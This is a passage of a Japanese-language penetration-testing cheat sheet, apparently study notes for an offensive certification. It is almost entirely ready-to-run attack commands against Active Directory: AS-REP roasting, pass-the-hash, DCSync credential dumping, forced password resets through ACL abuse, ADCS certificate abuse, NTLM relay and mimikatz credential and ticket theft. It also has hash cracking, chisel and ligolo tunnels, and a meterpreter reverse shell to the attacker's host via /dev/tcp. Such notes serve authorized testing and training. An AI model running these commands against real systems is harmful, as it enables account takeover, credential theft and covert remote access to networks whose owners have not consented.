### 8.2 AS-REP Roasting (事前認証無効ユーザ)

```bash
impacket-GetNPUsers $domain/ -usersfile users.txt -dc-ip $dc -no-pass -format hashcat
impacket-GetNPUsers $domain/<USER>:<PASS> -dc-ip $dc -format hashcat -outputfile asrep.hash
impacket-GetNPUsers -dc-ip $dc -request -format hashcat -outputfile asrep.hash \
  -usersfile users.txt $domain/
```

```powershell
.\Rubeus.exe asreproast
```

### 8.3 Pass-the-Hash

```bash
# nxc
nxc smb $ip -u <USER> -H <NTHASH> --shares
nxc smb $ip -u <USER> -H <NTHASH> -x 'whoami'

# impacket
impacket-psexec  $domain/<USER>@$ip -hashes :<NTHASH>
impacket-wmiexec $domain/<USER>@$ip -hashes :<NTHASH>
impacket-smbclient $domain/<USER>@$ip -hashes :<NTHASH>

# pth-smbclient
pth-smbclient //$ip/<SHARE> -U "$domain/<USER>%<NTHASH>"
```

```powershell
# mimikatz Over-Pass-the-Hash
sekurlsa::pth /user:Administrator /ntlm:<NTHASH> /domain:$domain
```

### 8.4 DCSync / Secretsdump

```bash
# リモートDCSync (Replication権限が必要)
impacket-secretsdump $domain/<USER>:<PASS>@$dc
impacket-secretsdump $domain/<USER>@$dc -hashes :<NTHASH>
impacket-secretsdump $domain/Administrator@$dc -hashes :<NTHASH>

# オフライン (SAM + SYSTEM)
impacket-secretsdump -sam SAM -system SYSTEM LOCAL -outputfile dump
# オフライン (NTDS + SYSTEM)
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### 8.5 ACL悪用 (DACLチェイン)

```bash
# 書き込み可能オブジェクトの確認
bloodyAD -d $domain -u <USER> -p <PASS> --host $ip get writable --right WRITE --detail

# パスワード強制リセット (GenericAll / WriteProperty 等)
bloodyAD -d $domain -u <USER> -p <PASS> --host $ip \
  set password <TARGET_USER> '<NEW_PASS>'
```

### 8.6 ADCS悪用 (certipy)

```bash
# 1. 脆弱テンプレート発見
certipy-ad find -u <USER>@$domain -p <PASS> -dc-ip $dc -vulnerable -stdout

# 2. ESC1 (任意UPN要求)
certipy-ad req -u <USER>@$domain -p <PASS> -dc-ip $dc \
  -ca <CA> -template <TEMPLATE> -upn administrator@$domain

# 3. PFX→TGT/NTHASH
certipy-ad auth -pfx administrator.pfx -dc-ip $dc

# 4. Shadow Credentials (msDS-KeyCredentialLink書込権限)
certipy-ad shadow auto -u <USER>@$domain -p <PASS> -account <TARGET> -dc-ip $dc

# 5. PtH
impacket-psexec $domain/administrator@$dc -hashes :<NTHASH>
```

### 8.7 NTLM Relay

```bash
# Responder (LLMNR/NBT-NS/mDNS Poisoning)
sudo responder -I tun0 -wv

# ntlmrelayx (SMB署名無効ターゲット)
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -t mssql://$ip -smb2support
impacket-ntlmrelayx -t mssql://$ip --no-smb-server --no-http-server   # ポート競合回避

# 強制認証トリガ (Win→Kali)
cmd.exe /c "\\$lhost\share"
```

### 8.8 mimikatz

```powershell
# 一行モード (リバースシェル向け)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"  "exit"
.\mimikatz.exe "privilege::debug" "lsadump::secrets"           "exit"
.\mimikatz.exe "privilege::debug" "lsadump::sam"               "exit"

# トークン偽装
mimikatz # token::list
mimikatz # token::elevate /id:<TOKEN_ID>
mimikatz # !cmd.exe

# Pass-the-Ticket
.\Rubeus.exe asktgt /user:Administrator /rc4:<NTHASH> /domain:$domain
.\Rubeus.exe asktgt /user:Administrator /password:<PASS> /domain:$domain
.\Rubeus.exe triage             # 既存TGT一覧
.\Rubeus.exe dump               # ダンプ
```

### 8.9 metasploit (補助)

```bash
msfconsole
search <service>
use <id>
show options
# meterpreter内
meterpreter > execute -f /bin/sh -i
meterpreter > execute -f /bin/bash -a "-c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"
```

---

## 9. ハッシュクラック

### 9.1 識別

```bash
hash-identifier
hashid <hash>
# Webツール:
#   https://crackstation.net/
#   https://hashes.com/en/tools/hash_identifier
#   https://hashcat.net/wiki/doku.php?id=example_hashes
```

### 9.2 整形

```bash
# 改行・空白除去
cat hash.txt | tr -d ' \n' > hash_clean.txt

# /etc/shadow + /etc/passwd 結合
unshadow passwd shadow > unshadowed.txt
john unshadowed.txt
```

### 9.3 John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=NT      --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=raw-md5 hash.txt
john --show hash.txt
```

### 9.4 Hashcat

```bash
hashcat -m <mode> -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt   # NTLM
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt   # NetNTLMv2 (Responder)
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  # Kerberos TGS (Kerberoast)
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  # AS-REP

# モード番号検索
hashcat -h | grep -i "ssh"
```

### 9.5 主要 hashcat -m 早見表

| -m | 種別 | 取得元 |
|----|------|--------|
| 0 | MD5 | — |
| 100 | SHA1 | — |
| 500 | md5crypt ($1$) | /etc/shadow |
| 1000 | NTLM | SAM / DCSync |
| 1800 | sha512crypt ($6$) | /etc/shadow |
| 3200 | bcrypt | DB |
| 5600 | NetNTLMv2 | Responder |
| 7500 | Kerberos AS-REQ pre-auth | krb5pa |
| 13100 | Kerberos TGS-REP (RC4) | Kerberoast |
| 18200 | Kerberos AS-REP | AS-REP Roast |
| 19700 | Kerberos TGS-REP (AES256) | Kerberoast |

---

## 10. ピボッティング / トンネリング

### 10.1 chisel (リバースSOCKS)

```bash
# Kali (リスナー)
./chisel server --port 9000 --reverse

# ターゲット
./chisel client $lhost:9000 R:socks
./chisel client $lhost:9000 R:8080:127.0.0.1:80    # ポート転送
```

### 10.2 ligolo-ng (TUNインターフェース)

```bash
# Kali (proxy)
sudo /tools/ligolo-ng/proxy -laddr 0.0.0.0:11601 -selfcert -v

# ターゲット (agent)
./agent.exe -connect $lhost:11601 -ignore-cert
./agent      -connect $lhost:11601 -ignore-cert     # Linux

# proxyコンソール
interface_create --name ligolo
session                                              # セッション選択
ifconfig                                             # 内部CIDR確認
route_add --name ligolo --route <internal_cidr>/24
tunnel_start
```

### 10.3 SSH ポートフォワード

```bash
# ローカル → リモートの内部サービス
ssh <USER>@$ip -L 8080:127.0.0.1:8080

# リモート → ローカル (Reverse)
ssh <USER>@$ip -R 9000:127.0.0.1:9000

# Dynamic SOCKS
ssh <USER>@$ip -D 1080
```

---

## 11. ユーティリティ

### 11.1 ファイルサーバ

```bash
# Python
python3 -m http.server 8001
~/.local/bin/uploadserver -d /tmp/inbox 8089       # 受信用

# impacket SMB (NTLMv2キャプチャ兼用)
impacket-smbserver share . -smb2support
```

### 11.2 C/Pythonビルド

```bash
gcc -o exploit exploit.c
gcc -o exploit32 -m32 exploit.c
./exploit
```

### 11.3 Base64 / 文字操作

```bash
echo -n '<text>' | base64
echo '<b64>' | base64 -d
xxd file | head
```
